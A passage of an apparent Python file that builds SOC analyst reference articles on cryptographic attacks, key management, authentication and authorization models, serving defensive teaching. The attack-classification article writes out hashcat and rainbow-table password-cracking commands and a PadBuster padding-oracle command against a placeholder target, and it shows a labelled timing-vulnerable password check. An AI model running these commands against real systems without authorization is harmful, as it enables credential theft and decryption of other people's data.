## Attack Classification

| Category            | Target                    | Requires                    |
|--------------------|---------------------------|-----------------------------|
| Brute force        | Key space                 | Time and compute            |
| Mathematical       | Algorithm weakness        | Cryptanalytic knowledge     |
| Implementation     | Code/hardware bugs        | Access to implementation    |
| Side-channel       | Physical leakage          | Physical/timing access      |
| Protocol           | Protocol design flaws     | Network access              |
| Social engineering | Human operators           | Social skills               |

## Brute Force Attacks

Exhaustively trying every possible key until the correct one is found.

| Key Size  | Possible Keys | Time at 10^12 keys/sec | Feasible? |
|-----------|---------------|------------------------|-----------|
| 40-bit    | ~10^12        | ~1 second              | Trivial   |
| 56-bit    | ~7 x 10^16   | ~20 hours              | Yes       |
| 64-bit    | ~1.8 x 10^19 | ~213 days              | Expensive |
| 128-bit   | ~3.4 x 10^38 | ~10^14 years           | Impossible|
| 256-bit   | ~1.2 x 10^77 | ~10^53 years           | Impossible|

```bash
# Dictionary attack on a hash
hashcat -m 0 hash.txt wordlist.txt

# Brute force with mask
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a

# Rainbow table attack
rtgen md5 loweralpha-numeric 1 8 0 10000 10000 0
rtsort *.rt
rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592
```

## Birthday Attack

Based on the birthday paradox: in a group of 23 people, there is a 50% chance two
share a birthday. Applied to hash functions, finding any two inputs with the same
hash is much easier than finding a specific collision.

```
For an n-bit hash:
- Preimage resistance: 2^n operations (find input for given hash)
- Collision resistance: 2^(n/2) operations (find ANY two inputs with same hash)

Hash Size    Collision Resistance    Preimage Resistance
128-bit      2^64 (feasible)        2^128 (infeasible)
160-bit      2^80 (expensive)       2^160 (infeasible)
256-bit      2^128 (infeasible)     2^256 (infeasible)
```

This is why MD5 (128-bit) and SHA-1 (160-bit) are considered broken for collision
resistance, even though preimage attacks are still impractical.

## Known-Plaintext Attack (KPA)

Attacker has both plaintext and corresponding ciphertext, and tries to derive the key.

```
Given:  P1 -> C1 (known pair)
        P2 -> C2 (known pair)
Goal:   Find key K

Vulnerable: Simple XOR ciphers, historical ciphers
Resistant:  AES, modern block ciphers (designed to resist KPA)

Example: WWII Enigma - Allies exploited known message formats
("weather report", standard greetings) to break the cipher
```

## Chosen-Plaintext Attack (CPA)

Attacker can encrypt arbitrary plaintexts and observe the ciphertexts.

```
Attacker chooses: P1, P2, P3, ...
Observes:         C1, C2, C3, ...
Goal: Deduce key or decrypt other ciphertexts

ECB mode is vulnerable:
- Encrypt same block twice -> same ciphertext -> reveals patterns
- This is why ECB mode must never be used

Modern ciphers (AES) are designed to be CPA-secure with proper modes (GCM, CTR)
```

## Chosen-Ciphertext Attack (CCA)

Attacker can decrypt arbitrary ciphertexts (except the target).

```
Attacker submits: C1, C2, C3, ... for decryption
Receives:         P1, P2, P3, ...
Goal: Decrypt target ciphertext C_target

RSA without proper padding (PKCS#1 v1.5) is vulnerable
Solution: Use OAEP padding (RSA-OAEP)
```

## Padding Oracle Attack

Exploits error messages that distinguish between valid and invalid padding in CBC mode.

```
Attack flow:
1. Send modified ciphertext to server
2. Server decrypts and checks padding
3. Server returns different errors:
   - "Invalid padding" -> padding was wrong
   - "Invalid MAC" -> padding was correct, MAC check failed
4. Attacker uses this oracle to decrypt one byte at a time

Affected: CBC mode without authenticated encryption
Example: POODLE attack on SSL 3.0, Lucky13 on TLS

Mitigation:
- Use AEAD (AES-GCM) instead of CBC
- Return identical error for all decryption failures
- Encrypt-then-MAC (not MAC-then-encrypt)
```

```bash
# Testing for padding oracle with PadBuster
padbuster https://target.com/decrypt?data=CIPHERTEXT CIPHERTEXT 16 -encoding 0
```

## Side-Channel Attacks

These exploit physical characteristics of the cryptographic implementation rather than
mathematical weaknesses.

| Side Channel   | What Leaks                    | Example Attack            |
|---------------|-------------------------------|---------------------------|
| Timing         | Execution time differences    | Cache-timing on AES       |
| Power          | Power consumption patterns    | DPA on smart cards        |
| EM radiation   | Electromagnetic emissions     | TEMPEST attacks           |
| Acoustic       | Sound from CPU/keyboard       | RSA key extraction via mic|
| Cache          | CPU cache access patterns     | Spectre, Meltdown         |
| Fault          | Induced errors reveal keys    | Voltage glitching         |

### Timing Attack Example

```python
# VULNERABLE: timing reveals password length match
def check_password(input_pw, stored_pw):
    if len(input_pw) != len(stored_pw):
        return False
    for i in range(len(input_pw)):
        if input_pw[i] != stored_pw[i]:
            return False  # Returns early on first mismatch
    return True

# SECURE: constant-time comparison
import hmac
def check_password_safe(input_pw, stored_pw):
    return hmac.compare_digest(input_pw.encode(), stored_pw.encode())
    # Always compares all bytes, same time regardless of where mismatch occurs
```

### Spectre/Meltdown (CPU Cache Side Channels)

```
Impact: Read memory across process/kernel boundaries
Affected: Most CPUs manufactured 2000-2018
Mitigation: CPU microcode updates, OS patches, compiler mitigations
Detection: Monitor for unusual cache-timing patterns
```

## Downgrade Attacks

Force communication to use weaker, vulnerable protocols or ciphers.

```
Examples:
- POODLE: Forces TLS -> SSL 3.0
- FREAK: Forces RSA -> 512-bit export RSA
- Logjam: Forces DH -> 512-bit export DH
- DROWN: Cross-protocol attack using SSLv2

Mitigation:
- Disable all legacy protocols (SSL, TLS 1.0/1.1)
- Remove weak cipher suites
- Implement TLS_FALLBACK_SCSV
- Test with testssl.sh
```

```bash
# Test for downgrade vulnerability
openssl s_client -connect example.com:443 -ssl3 2>&1 | grep -i "alert"
openssl s_client -connect example.com:443 -tls1 2>&1 | grep -i "alert"

# Both should fail if properly configured
```

## Meet-in-the-Middle Attack

Reduces double encryption to approximately twice the work of single encryption.

```
Double DES: C = E_K2(E_K1(P))
Expected security: 2^112 (56+56 bits)
Actual security:   2^57 (meet in the middle)

Attack:
1. Encrypt P with all possible K1 -> store results
2. Decrypt C with all possible K2 -> check against stored results
3. Match found = both keys identified

This is why 2DES is not used, and 3DES applies encrypt-decrypt-encrypt
```

## Quantum Computing Threats

| Algorithm    | Classical Security | Quantum Attack     | Post-Quantum Security |
|-------------|-------------------|--------------------|-----------------------|
| AES-128     | 128-bit           | Grover: 64-bit     | Increase to AES-256   |
| AES-256     | 256-bit           | Grover: 128-bit    | Still secure          |
| RSA-2048    | 112-bit           | Shor: polynomial   | BROKEN                |
| ECC P-256   | 128-bit           | Shor: polynomial   | BROKEN                |
| SHA-256     | 256-bit           | Grover: 128-bit    | Still secure          |

### Post-Quantum Cryptography (PQC)

NIST standardized PQC algorithms in 2024:

| Algorithm      | Type           | Replaces     | Standard    |
|---------------|----------------|-------------|-------------|
| ML-KEM (Kyber)| Key encapsulation| RSA, ECDH  | FIPS 203    |
| ML-DSA (Dilithium)| Signatures  | RSA, ECDSA | FIPS 204    |
| SLH-DSA (SPHINCS+)| Signatures  | RSA, ECDSA | FIPS 205    |

```bash
# Check if your OpenSSL supports PQC (via oqs-provider)
openssl list -kem-algorithms 2>/dev/null | grep -i kyber

# Generate PQC key pair (with liboqs)
# oqs-keygen -a Kyber512 -o pqc_key.pem
```

## SOC Analyst Action Items

```
Cryptographic Weakness Assessment:
[ ] Inventory all cryptographic algorithms in use
[ ] Flag any use of MD5, SHA-1, DES, 3DES, RC4
[ ] Verify AES key sizes are 128-bit minimum
[ ] Check RSA key sizes are 2048-bit minimum
[ ] Ensure no ECB mode in use
[ ] Verify AEAD modes (GCM) instead of CBC where possible
[ ] Test for TLS downgrade vulnerabilities
[ ] Plan for post-quantum migration (inventory RSA/ECC usage)
[ ] Review constant-time implementations for auth code
[ ] Monitor for cryptographic library CVEs
```

## Key Takeaways

1. Birthday attacks halve the effective security of hash functions
2. Padding oracle attacks make CBC without authentication dangerous
3. Side-channel attacks exploit implementation, not algorithms
4. Downgrade attacks force weak crypto - disable legacy protocols
5. Quantum computers will break RSA and ECC - plan PQC migration
6. Use AEAD (AES-GCM) to prevent padding oracle and related attacks
"""
    ))

    # --------------------------------------------------------------------------
    # Article 16: Random Number Generation and Key Management
    # --------------------------------------------------------------------------
    articles.append((
        "Random Number Generation and Key Management",
        ["cryptography", "key-management", "rng", "hsm", "tpm", "key-rotation", "entropy"],
        r"""# Random Number Generation and Key Management

## Overview

Cryptographic security fundamentally depends on two things: strong algorithms and
properly managed keys. A perfectly implemented AES-256 is worthless if the key is
predictable, stored in plaintext, or never rotated. This article covers random
number generation (the foundation of key creation) and the full key lifecycle.

## Random Number Generation

### Why Randomness Matters

```
Predictable randomness = predictable keys = broken encryption

Real-world failures:
- Debian OpenSSL bug (2008): Faulty RNG produced only 32,767 possible keys
- Sony PS3 ECDSA (2010): Reused random nonce -> private key extracted
- Dual_EC_DRBG (2013): NSA backdoor in NIST-approved RNG
- Bitcoin wallet thefts: Weak RNG in Android led to key prediction
```

### PRNG vs TRNG vs CSPRNG

| Type    | Full Name                          | Source               | Security    |
|---------|------------------------------------|----------------------|-------------|
| PRNG    | Pseudo-Random Number Generator     | Algorithm (seed)     | NOT secure  |
| CSPRNG  | Cryptographically Secure PRNG      | Algorithm + entropy  | Secure      |
| TRNG    | True Random Number Generator       | Physical phenomena   | Secure      |
| HRNG    | Hardware RNG                       | CPU instruction      | Secure      |

### PRNG (Not for Cryptography)

```python
# INSECURE for cryptographic use
import random
random.randint(0, 2**256)  # Predictable if seed is known

# Python's random module uses Mersenne Twister
# State can be reconstructed from 624 consecutive outputs
# NEVER use for keys, tokens, passwords, or nonces
```

### CSPRNG (Use This)

```python
# SECURE - use for all cryptographic purposes
import secrets
import os

# Generate random bytes
key = secrets.token_bytes(32)        # 256-bit key
token = secrets.token_hex(32)        # 64-char hex string
url_token = secrets.token_urlsafe(32) # URL-safe base64

# OS-level CSPRNG
key = os.urandom(32)                 # Uses /dev/urandom on Linux
```

```bash
# Linux CSPRNG sources
# /dev/random  - blocks when entropy pool is low (older kernels)
# /dev/urandom - never blocks, preferred for most uses

# Generate random key material
openssl rand -hex 32
openssl rand -base64 32
head -c 32 /dev/urandom | xxd -p

# Windows CSPRNG
powershell -Command "[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(32) | ForEach-Object { '{0:X2}' -f $_ }"

# Check available entropy (Linux)
cat /proc/sys/kernel/random/entropy_avail
# Should be > 256 for good randomness
```

### Entropy Sources

| Source               | Entropy Quality | Speed    | Notes                    |
|---------------------|-----------------|----------|--------------------------|
| CPU timing jitter   | Good            | Fast     | RDRAND/RDSEED (Intel)    |
| Disk I/O timing     | Good            | Slow     | Traditional Linux source |
| Network interrupts  | Moderate        | Variable | Available on servers     |
| Mouse/keyboard      | Good            | Slow     | Only on desktops         |
| Hardware RNG        | Excellent       | Fast     | Dedicated chip           |
| Thermal noise       | Excellent       | Slow     | HSM-grade                |

```bash
# Check CPU hardware RNG support
grep -o rdrand /proc/cpuinfo | head -1
grep -o rdseed /proc/cpuinfo | head -1

# Install additional entropy daemon
apt install haveged   # CPU timing jitter entropy
systemctl enable haveged

# Or use rng-tools with hardware RNG
apt install rng-tools
rngd -r /dev/hwrng
```

## Key Generation Best Practices

```bash
# Generate AES-256 key
openssl rand -hex 32 > aes_key.bin
chmod 600 aes_key.bin

# Generate RSA-4096 key pair
openssl genrsa -aes256 -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem

# Generate ECC key pair
openssl ecparam -genkey -name prime256v1 | openssl ec -aes256 -out ec_private.pem

# Generate Ed25519 key pair (SSH)
ssh-keygen -t ed25519 -C "user@host" -f ~/.ssh/id_ed25519

# Generate strong password/passphrase
openssl rand -base64 24   # 32 characters
python3 -c "import secrets; print(secrets.token_urlsafe(24))"
```

| Key Type    | Recommended Size | Command                              |
|-------------|-----------------|--------------------------------------|
| AES         | 256-bit         | `openssl rand -hex 32`               |
| RSA         | 3072+ bit       | `openssl genrsa 4096`                |
| ECC         | P-256 / P-384   | `openssl ecparam -genkey -name prime256v1` |
| HMAC        | 256-bit         | `openssl rand -hex 32`               |
| Ed25519     | 256-bit (fixed) | `ssh-keygen -t ed25519`              |

## Key Storage

### Hardware Security Module (HSM)

HSMs are tamper-resistant hardware devices that store keys and perform cryptographic
operations internally. Keys never leave the HSM.

| Feature            | HSM                              | Software Keystore       |
|-------------------|---------------------------------|-------------------------|
| Key extraction    | Not possible (by design)         | Possible                |
| Tamper resistance | Physical + logical               | Software only           |
| Performance       | Dedicated crypto processor       | Uses CPU                |
| Cost              | $5,000 - $50,000+               | Free                    |
| FIPS validation   | 140-2/140-3 Level 2-4           | Level 1 at best         |
| Examples          | Thales Luna, AWS CloudHSM        | Java KeyStore, DPAPI    |

```bash
# PKCS#11 interface to HSM (example with SoftHSM for testing)
softhsm2-util --init-token --slot 0 --label "TestToken"
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so -l --keypairgen --key-type rsa:2048 --label "mykey"
```

### Trusted Platform Module (TPM)

TPM is a chip on the motherboard that stores keys tied to the specific hardware.

```powershell
# Windows - check TPM status
Get-Tpm
tpm.msc

# Store a key in TPM (via CNG)
# Used by BitLocker, Windows Hello, Credential Guard

# Linux TPM2 tools
tpm2_createprimary -C o -c primary.ctx
tpm2_create -C primary.ctx -u key.pub -r key.priv
```

### Cloud Key Management

| Service            | Provider | HSM-Backed | FIPS 140-2 |
|-------------------|----------|------------|------------|
| AWS KMS           | AWS      | Yes        | Level 2    |
| Azure Key Vault   | Azure    | Yes        | Level 2/3  |
| GCP Cloud KMS     | Google   | Yes        | Level 3    |
| AWS CloudHSM      | AWS      | Dedicated  | Level 3    |
| HashiCorp Vault   | Open src | Optional   | Varies     |

```bash
# AWS KMS - create a key
aws kms create-key --description "Application encryption key" --key-usage ENCRYPT_DECRYPT

# Encrypt data with KMS key
aws kms encrypt --key-id alias/mykey --plaintext fileb://secret.txt --output text --query CiphertextBlob | base64 -d > encrypted.bin

# Decrypt
aws kms decrypt --ciphertext-blob fileb://encrypted.bin --output text --query Plaintext | base64 -d > decrypted.txt

# HashiCorp Vault
vault secrets enable transit
vault write transit/keys/my-key type=aes256-gcm96
vault write transit/encrypt/my-key plaintext=$(echo "secret" | base64)
```

## Key Rotation

### Why Rotate Keys

```
1. Limits exposure if key is compromised
2. Compliance requirement (PCI DSS, NIST)
3. Reduces amount of data encrypted with one key
4. Limits cryptanalytic material available to attacker
```

### Rotation Schedule

| Key Type               | Rotation Period      | Notes                     |
|-----------------------|----------------------|---------------------------|
| TLS certificates      | 90 days - 1 year     | Trending toward 90 days   |
| API keys              | 90 days              | Automated rotation        |
| Database encryption   | 1 year               | Re-encrypt or envelope    |
| SSH keys              | 1-2 years            | Certificate-based better  |
| Root CA keys          | 10-20 years          | Offline, ceremony-based   |
| Service account passwords | 90 days           | Use gMSA where possible   |
| krbtgt (AD)           | 180 days             | Reset twice per rotation  |

```bash
# Automated certificate rotation with certbot
certbot renew --deploy-hook "systemctl reload nginx"

# AWS KMS automatic key rotation (annual)
aws kms enable-key-rotation --key-id alias/mykey

# Rotate API key (application-level)
# 1. Generate new key
# 2. Update all consumers to accept both old and new
# 3. Switch primary to new key
# 4. Remove old key after grace period
```

## Key Escrow

Key escrow stores a copy of the encryption key with a trusted third party for
emergency recovery.

```
Use cases:
- Employee leaves and encrypted data must be recovered
- Legal/regulatory requirement for lawful access
- Disaster recovery

Risks:
- Escrowed keys can be stolen
- Compelled disclosure by government
- Single point of failure

Best practices:
- Split key into shares (Shamir's Secret Sharing)
- Require M-of-N key holders for recovery
- Audit all escrow access
- Store in HSM
```

```bash
# Shamir's Secret Sharing (ssss tool)
# Split a key into 5 shares, requiring 3 to reconstruct
echo "my_encryption_key_here" | ssss-split -t 3 -n 5

# Reconstruct
ssss-combine -t 3
# Enter 3 of 5 shares
```

## Key Destruction

Secure key destruction ensures keys cannot be recovered after they are no longer needed.

```bash
# Secure file deletion on Linux
shred -vfz -n 3 key.pem
srm key.pem  # secure-delete package

# On SSDs, overwriting may not work due to wear leveling
# Use full-disk encryption and destroy the encryption key instead

# HSM key destruction
pkcs11-tool --module /path/to/module.so -l --delete-object --type privkey --label "mykey"

# AWS KMS - schedule key deletion (7-30 day waiting period)
aws kms schedule-key-deletion --key-id alias/mykey --pending-window-in-days 7

# Windows - secure delete with cipher
cipher /w:C:\path\to\directory
```

### Key Destruction Checklist

```
[ ] All copies of the key identified (primary, backups, escrow)
[ ] All encrypted data either re-encrypted with new key or intentionally abandoned
[ ] Key material securely wiped (not just deleted)
[ ] Backup media containing key material destroyed
[ ] HSM key slots cleared
[ ] Key destruction documented (who, when, why, method)
[ ] Audit trail preserved (key existed, was used for X, destroyed on date)
```

## Key Management Lifecycle Summary

```
1. Generation    -> Use CSPRNG, appropriate key size, HSM if possible
2. Distribution  -> Secure channel (TLS, out-of-band), key wrapping
3. Storage       -> HSM, TPM, encrypted keystore, access controls
4. Usage         -> Minimize exposure, audit access, least privilege
5. Rotation      -> Automated, scheduled, without downtime
6. Archival      -> Retained for decryption of historical data
7. Escrow        -> Split keys, M-of-N, HSM storage
8. Destruction   -> Secure wipe, all copies, documented
```

## SOC Analyst Key Management Audit

```
Assessment Questions:
[ ] How are cryptographic keys generated? (CSPRNG? HSM?)
[ ] Where are keys stored? (Plaintext files? Vault? HSM?)
[ ] Who has access to key material? (Least privilege?)
[ ] How often are keys rotated? (Meets compliance?)
[ ] Is key usage logged and monitored?
[ ] Are backup keys stored securely?
[ ] Is there a key recovery procedure?
[ ] How are keys destroyed when no longer needed?
[ ] Are any keys hardcoded in source code?
[ ] Is there separation between DEK and KEK?
```

## Key Takeaways

1. Always use CSPRNG (secrets module, /dev/urandom, CNG) for key generation
2. Never use standard PRNG (random module, Math.random) for cryptographic purposes
3. HSMs provide the highest level of key protection
4. Key rotation must be automated and regularly scheduled
5. Key destruction must be verifiable and documented
6. The most common key management failure is storing keys alongside encrypted data
"""
    ))

    return articles


"""
IXION Knowledge Base - Identity and Access Management
SOC Analyst Reference Articles: IAM, Authentication, Authorization, PAM, Zero Trust
16 articles covering CompTIA Security+ aligned content for security practitioners.
"""


def identity_access_articles():
    """Return 16 identity and access management articles for the SOC knowledge base."""
    articles = []

    # ---------------------------------------------------------------
    # Article 1: Authentication Methods Passwords MFA Biometrics
    # ---------------------------------------------------------------
    articles.append(("Authentication Methods Passwords MFA Biometrics", ["identity", "access-management", "authentication", "mfa", "biometrics", "passwords"], r"""# Authentication Methods: Passwords, MFA, and Biometrics

## Overview

Authentication is the process of verifying that an entity (user, device, or service) is who or what it claims to be. It answers the question "Are you really who you say you are?" before granting any access. As a SOC analyst, understanding authentication methods is essential for detecting credential abuse, investigating account takeovers, and recommending security improvements.

Authentication factors fall into three classical categories:

| Factor Type | Description | Examples |
|-------------|-------------|----------|
| Something you know | Knowledge-based secrets | Passwords, PINs, security questions |
| Something you have | Physical possession of a device or token | Smart cards, hardware keys, phones |
| Something you are | Biometric characteristics | Fingerprints, facial recognition, iris scan |

Multi-factor authentication (MFA) combines two or more distinct factor types to strengthen verification.

## Password-Based Authentication

Passwords remain the most widely deployed authentication method despite well-known weaknesses.

### How Password Auth Works

1. User submits username + password
2. System retrieves stored password hash for that username
3. System hashes the submitted password with the same algorithm and salt
4. If hashes match, authentication succeeds

### Password Storage Best Practices

Passwords must never be stored in plaintext. Secure storage uses adaptive hashing:

```
# Modern password hashing — bcrypt example (Python)
import bcrypt

password = b"Hunter2IsNotSecure!"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verification
if bcrypt.checkpw(password, hashed):
    print("Authentication successful")
```

| Algorithm | Status | Notes |
|-----------|--------|-------|
| MD5 | NEVER USE | Fast, no salt by default, trivially cracked |
| SHA-1 | NEVER USE | Collision attacks demonstrated |
| SHA-256 | Avoid for passwords | Fast hash, not designed for passwords |
| bcrypt | Recommended | Adaptive cost factor, built-in salt |
| scrypt | Recommended | Memory-hard, resistant to GPU attacks |
| Argon2id | Best practice | Winner of Password Hashing Competition, memory + time hard |

### Password Attack Methods

SOC analysts encounter these password attacks regularly:

| Attack | Description | Detection Indicators |
|--------|-------------|---------------------|
| Brute force | Try all combinations systematically | High volume of failed logins from one source |
| Dictionary | Try common words and known passwords | Moderate failed logins, common password attempts |
| Credential stuffing | Reuse leaked credentials from breaches | Distributed sources, valid usernames, low failure rate per account |
| Password spraying | Try one password against many accounts | One or two failures per account, many accounts targeted |
| Rainbow tables | Precomputed hash-to-password lookup | Offline attack against stolen hashes |
| Keylogging | Capture keystrokes on compromised host | Malware indicators on endpoint |

### Detecting Password Attacks in Logs

```
# Windows Security Event Log — failed logon
Event ID 4625: An account failed to log on
  - Status 0xC000006A = bad password
  - Status 0xC0000064 = unknown username
  - Status 0xC0000234 = account locked out

# Linux — failed SSH authentication
grep "Failed password" /var/log/auth.log | awk '{print $9, $11}' | sort | uniq -c | sort -rn

# Splunk query for password spraying detection
index=windows EventCode=4625
| stats count dc(TargetUserName) as unique_users by IpAddress
| where unique_users > 10 AND count > 20
```

## Token-Based Authentication

Token-based systems issue a cryptographic token after initial verification, avoiding repeated credential transmission.

### Common Token Types

| Token Type | Format | Typical Use |
|------------|--------|-------------|
| Session cookie | Server-side session ID | Traditional web apps |
| JWT (JSON Web Token) | Base64-encoded JSON with signature | APIs, SPAs, microservices |
| OAuth 2.0 access token | Opaque or JWT | Third-party API access |
| SAML assertion | XML with digital signature | Enterprise SSO |
| Kerberos ticket | Binary, encrypted | Windows domain authentication |

### JWT Structure

```
# JWT has three Base64URL-encoded parts separated by dots
Header.Payload.Signature

# Header
{"alg": "RS256", "typ": "JWT"}

# Payload (claims)
{
  "sub": "user123",
  "name": "Jane Analyst",
  "roles": ["soc-analyst", "viewer"],
  "iat": 1700000000,
  "exp": 1700003600
}

# Signature = RS256(base64(header) + "." + base64(payload), private_key)
```

### Token Security Concerns for SOC Analysts

- **Token theft**: Stolen JWTs grant access until expiry; monitor for token reuse from unusual IPs
- **Algorithm confusion**: Attacker changes `alg` from RS256 to HS256, using public key as HMAC secret
- **Missing expiration**: Tokens without `exp` claim never expire
- **Token in URL**: Tokens in query strings leak through referrer headers and server logs

## Biometric Authentication

Biometrics use unique physical or behavioral characteristics for identification.

### Physiological Biometrics

| Type | Mechanism | FAR | FRR | Spoofing Risk |
|------|-----------|-----|-----|---------------|
| Fingerprint | Minutiae point matching on ridge patterns | Low | Low | Medium (gummy fingers, lifted prints) |
| Facial recognition | Geometric measurement of facial landmarks | Medium | Low | Medium (photos, 3D masks) |
| Iris scan | Pattern analysis of iris texture | Very low | Low | Low (requires live eye) |
| Retinal scan | Blood vessel pattern in retina | Very low | Medium | Very low |
| Palm vein | Infrared vein pattern mapping | Very low | Low | Very low |

**FAR** = False Acceptance Rate (impostor accepted). **FRR** = False Rejection Rate (legitimate user rejected).

### Behavioral Biometrics

| Type | What It Measures | Use Case |
|------|-----------------|----------|
| Keystroke dynamics | Typing speed, dwell time, flight time | Continuous authentication |
| Mouse dynamics | Movement patterns, click behavior | Fraud detection |
| Gait analysis | Walking pattern via accelerometer | Mobile device unlock |
| Voice recognition | Vocal tract characteristics, pitch, cadence | Phone-based auth, IVR systems |

### Biometric Attack Vectors

```
Presentation attacks (spoofing):
  - Fingerprint: silicone molds, gelatin fingers, lifted latent prints
  - Facial: printed photos, video replay, 3D-printed masks
  - Voice: recorded playback, AI voice synthesis

Template attacks:
  - Stealing stored biometric templates from databases
  - Unlike passwords, biometrics CANNOT be changed if compromised
  - Templates should be stored encrypted and never transmitted raw

Countermeasures:
  - Liveness detection (blink detection, pulse detection, challenge-response)
  - Multi-modal biometrics (combine face + fingerprint)
  - On-device processing (biometric never leaves the device)
  - Template protection (cancelable biometrics, fuzzy vaults)
```

## Authentication Strength Comparison

| Method | Security Level | Usability | Cost | Phishing Resistance |
|--------|---------------|-----------|------|-------------------|
| Password only | Low | High | Low | None |
| Password + SMS OTP | Medium | Medium | Low | Low (SIM swap) |
| Password + TOTP app | Medium-High | Medium | Low | Low (real-time phish) |
| Password + push notification | Medium-High | High | Medium | Low (MFA fatigue) |
| Password + hardware key (FIDO2) | Very High | Medium | Medium | High |
| Passwordless FIDO2 | Very High | High | Medium | Very High |
| Smartcard + PIN | Very High | Medium | High | High |
| Biometric + device binding | High | Very High | Medium | High |

## SOC Analyst Investigation Checklist

When investigating authentication-related incidents:

1. **Identify the authentication method** used for the compromised account
2. **Check for MFA bypass** indicators (session token theft, MFA fatigue, SIM swap)
3. **Correlate login timestamps** with user's normal patterns (geolocation, time of day)
4. **Review impossible travel** — logins from geographically distant locations within short windows
5. **Check for credential reuse** — was the same password used on breached services?
6. **Examine post-authentication activity** — what did the attacker do after gaining access?
7. **Assess lateral movement** — did the attacker use obtained credentials on other systems?
8. **Document the authentication chain** — initial access method through privilege escalation

## Key Takeaways

- Passwords alone are insufficient; always layer with additional factors
- Token-based auth shifts risk to token storage and transport security
- Biometrics provide convenience but introduce irrevocability concerns
- Defense in depth means combining multiple authentication methods
- SOC analysts must understand each method to detect its specific abuse patterns
"""))

    # ---------------------------------------------------------------
    # Article 2: Authorization Models RBAC ABAC MAC DAC
    # ---------------------------------------------------------------
    articles.append(("Authorization Models RBAC ABAC MAC DAC", ["identity", "access-management", "authorization", "rbac", "abac", "mac", "dac", "least-privilege"], r"""# Authorization Models: RBAC, ABAC, MAC, and DAC

## Overview

Authorization determines what an authenticated entity is allowed to do. While authentication answers "Who are you?", authorization answers "What can you do?" SOC analysts must understand authorization models to detect privilege escalation, unauthorized access, and policy misconfigurations.

The four fundamental access control models are:

| Model | Full Name | Control Basis | Example |
|-------|-----------|--------------|---------|
| DAC | Discretionary Access Control | Resource owner decides | NTFS file permissions |
| MAC | Mandatory Access Control | System-enforced labels | SELinux, classified networks |
| RBAC | Role-Based Access Control | User's assigned role | AD security groups |
| ABAC | Attribute-Based Access Control | Multiple attributes evaluated | AWS IAM policies |

## Discretionary Access Control (DAC)

In DAC, the resource owner decides who can access their resources. This is the default model on most operating systems.

### Characteristics

- Resource owners set permissions at their discretion
- Permissions can be delegated — owners can grant others the ability to grant access
- No central policy enforcement beyond what the owner configures
- Most flexible but least secure model

### DAC in Practice

```bash
# Linux DAC — owner sets file permissions
chmod 750 /opt/app/config.yaml      # owner=rwx, group=r-x, other=---
chown appuser:appgroup /opt/app/config.yaml

# Windows NTFS DAC — owner modifies ACL
icacls C:\Reports\Q4.xlsx /grant "Finance Team:(R)"
icacls C:\Reports\Q4.xlsx /grant "Jane.Analyst:(M)"
icacls C:\Reports\Q4.xlsx /deny "Interns:(R)"
```

### DAC Security Weaknesses

| Weakness | Risk | Example |
|----------|------|---------|
| Trojan horse problem | Malicious program inherits user's permissions | User runs malware that reads their files |
| Permission sprawl | Over time, too many users gain access | Shared folder readable by entire company |
| No flow control | Data can be copied to less protected locations | User copies classified file to public share |
| Owner override | Owners can bypass organizational policy | Developer shares production credentials file |

## Mandatory Access Control (MAC)

In MAC, the system enforces access decisions based on security labels. Individual users cannot override the policy.

### Security Labels and Clearance

```
Classification levels (military example):
  Top Secret > Secret > Confidential > Unclassified

Bell-LaPadula Model (confidentiality):
  - "No read up"   — cannot read data above your clearance
  - "No write down" — cannot write data below your clearance

Biba Model (integrity):
  - "No read down"  — cannot read data below your integrity level
  - "No write up"   — cannot write data above your integrity level
```

### MAC Implementation: SELinux

```bash
# Check SELinux status
getenforce
# Output: Enforcing

# View SELinux context of a file
ls -Z /var/www/html/index.html
# -rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 index.html

# Context format: user:role:type:level
# httpd_sys_content_t = type that Apache is allowed to read

# View process SELinux context
ps auxZ | grep httpd
# system_u:system_r:httpd_t:s0    root  1234  ... /usr/sbin/httpd

# SELinux policy: httpd_t can read httpd_sys_content_t
# But httpd_t CANNOT read user_home_t — even if Linux DAC allows it

# Check for SELinux denials
ausearch -m avc --start recent
# type=AVC msg=audit(...): avc:  denied  { read } for  pid=1234
#   comm="httpd" name="secret.txt" scontext=httpd_t tcontext=user_home_t
```

## Role-Based Access Control (RBAC)

RBAC assigns permissions to roles, and users are assigned to roles. This simplifies administration and enforces organizational structure.

### RBAC Concepts

```
Users        -->  Roles        -->  Permissions
jane.analyst      SOC-Analyst       Read alerts
bob.engineer      SOC-Engineer      Read alerts, Modify rules
alice.lead        SOC-Lead          Read alerts, Modify rules, Manage team
```

### Core RBAC Principles

| Principle | Description | Example |
|-----------|-------------|---------|
| Least privilege | Assign minimum permissions needed | Viewer role for read-only analysts |
| Separation of duties | Split critical functions across roles | Approver cannot also be requester |
| Role hierarchy | Senior roles inherit junior role permissions | Lead inherits Analyst permissions |
| Role constraints | Mutually exclusive role assignments | Cannot be both Auditor and Admin |

### RBAC in Active Directory

```powershell
# Create security groups for RBAC roles
New-ADGroup -Name "SOC-Analysts" -GroupScope Global -GroupCategory Security
New-ADGroup -Name "SOC-Engineers" -GroupScope Global -GroupCategory Security
New-ADGroup -Name "SOC-Leads" -GroupScope Global -GroupCategory Security

# Assign users to roles
Add-ADGroupMember -Identity "SOC-Analysts" -Members "jane.analyst","bob.jr"
Add-ADGroupMember -Identity "SOC-Engineers" -Members "bob.engineer"
Add-ADGroupMember -Identity "SOC-Leads" -Members "alice.lead"

# Verify role membership
Get-ADGroupMember -Identity "SOC-Analysts" | Select Name, SamAccountName
```

### Detecting RBAC Issues

```
# Splunk — detect users added to privileged groups
index=windows EventCode=4728 OR EventCode=4732 OR EventCode=4756
| table _time, TargetUserName, MemberName, SubjectUserName
| where TargetUserName IN ("Domain Admins","Enterprise Admins","Schema Admins")
```

## Attribute-Based Access Control (ABAC)

ABAC evaluates multiple attributes (user, resource, environment, action) against policies to make access decisions. It provides the finest-grained control.

### ABAC Attributes

| Category | Attribute Examples |
|----------|-------------------|
| Subject (user) | Department, clearance, role, location, device type |
| Resource | Classification, owner, type, sensitivity label |
| Action | Read, write, delete, execute, approve |
| Environment | Time of day, IP range, threat level, network zone |

### ABAC Policy Example (AWS IAM)

```json
{
  "Version": "2012-10-17",
